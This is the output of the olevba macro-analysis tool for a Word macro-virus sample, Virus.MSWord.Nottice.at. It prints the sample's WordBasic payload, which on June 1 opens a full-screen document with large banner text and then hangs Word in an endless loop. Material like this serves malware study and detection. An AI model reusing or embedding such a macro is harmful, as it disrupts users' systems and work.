olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nottice.at-b32c9b0e1986defbeaf32455f48942d14b5356f1
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Nottice.at-b32c9b0e1986defbeaf32455f48942d14b5356f1 
in file: Virus.MSWord.Nottice.at-b32c9b0e1986defbeaf32455f48942d14b5356f1 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If WordBasic.Day(WordBasic.Now()) = 1 And WordBasic.Month(WordBasic.Now()) = 6 Then
    WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Imprint MT Shadow"
    WordBasic.FontSize 60
    WordBasic.Bold
    WordBasic.Insert "HARKONE"
    WordBasic.StartOfLine
    WordBasic.CharRight 1, 1
    WordBasic.FormatFont Points:="48", Color:=6
    WordBasic.EndOfLine
    WordBasic.InsertPara
    WordBasic.InsertPara
    WordBasic.FontSize 48
    WordBasic.Insert "NJ [SLAM]"
HangOn:
GoTo HangOn
End If
End Sub
No suspicious keyword or IOC found.

